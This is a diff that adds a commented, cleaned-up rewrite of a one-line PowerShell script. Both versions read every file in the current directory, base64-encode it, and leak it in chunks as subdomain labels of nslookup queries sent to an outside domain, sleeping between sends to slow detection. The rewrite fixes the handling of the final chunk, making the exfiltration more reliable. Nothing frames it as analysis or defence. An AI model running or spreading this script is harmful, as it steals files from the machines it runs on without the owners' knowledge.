@@ -1,1 +1,39 @@
 $d="89.xxxx"; $s=4; $b=45; Get-ChildItem "." | Foreach-Object {$a=$_.Name; $z = [System.IO.File]::ReadAllBytes($_.FullName); $e = [System.Convert]::ToBase64String($z); $l=$e.Length; $r=""; $n=0; while ($n -le ($l/$b)) { $c=$b; if (($n*$b)+$c -gt $l) { $c=$l-($n*$b) }; $r+=$e.Substring($n*$b, $c) + "-."; if (($n%$s) -eq ($s-1)) { nslookup -type=A $r$a. $d; Start-Sleep -Seconds 10; $r="" } $n=$n+1 } nslookup -type=A $r$a. $d }
+
+---------
+
+$d = "aaa"  # The target domain
+$s = 1                 # Number of chunks before sending
+$b = 25                # Bytes per chunk
+$delay = 10            # Delay in seconds
+
+Get-ChildItem "." -File | Foreach-Object {
+    $a = $_.Name
+    $z = [System.IO.File]::ReadAllBytes($_.FullName)
+    $e = [System.Convert]::ToBase64String($z)
+    $l = $e.Length
+    $r = ""
+    $n = 0
+    
+    # Calculate total chunks
+    $totalChunks = [Math]::Ceiling($l / $b)
+
+    while ($n -lt $totalChunks) {
+        # Determine chunk size
+        $c = $b
+        if (($n * $b) + $c -gt $l) { $c = $l - ($n * $b) }
+        
+        # Build the sub-domain string
+        $r += $e.Substring($n * $b, $c) + "."
+        
+        # Send every $s chunks OR if it's the very last chunk
+        if (($n % $s) -eq ($s - 1) -or ($n -eq $totalChunks - 1)) {
+            $query = "$r$a.$d"
+            nslookup -type=A $query
+            
+            Start-Sleep -Seconds $delay
+            $r = "" # Reset buffer
+        }
+        $n++
+    }
+}
